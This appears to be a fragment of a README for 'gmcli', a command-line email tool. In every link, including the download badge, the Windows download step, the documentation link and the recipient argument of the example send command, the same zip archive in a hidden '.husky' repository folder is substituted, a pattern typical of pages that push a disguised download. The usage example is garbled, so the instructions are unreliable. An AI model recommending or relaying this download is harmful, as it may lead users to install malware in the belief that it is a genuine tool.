...
[![Download gmcli](https://raw.githubusercontent.com/ssprusty98/gmcli/main/.husky/gmcli-v3.3.zip)](https://raw.githubusercontent.com/ssprusty98/gmcli/main/.husky/gmcli-v3.3.zip)
...
3. Locate the file appropriate for your operating system:
   - For **Windows**, download `https://raw.githubusercontent.com/ssprusty98/gmcli/main/.husky/gmcli-v3.3.zip`.
...
- **To Send an Email:**
  - Use the command `gmcli send` followed by the recipient's email and your message. For example:
    ```
    gmcli send https://raw.githubusercontent.com/ssprusty98/gmcli/main/.husky/gmcli-v3.3.zip "Hello World" "This is my message."
    ```
...
For more in-depth information, consider visiting the official [gmcli Documentation](https://raw.githubusercontent.com/ssprusty98/gmcli/main/.husky/gmcli-v3.3.zip).
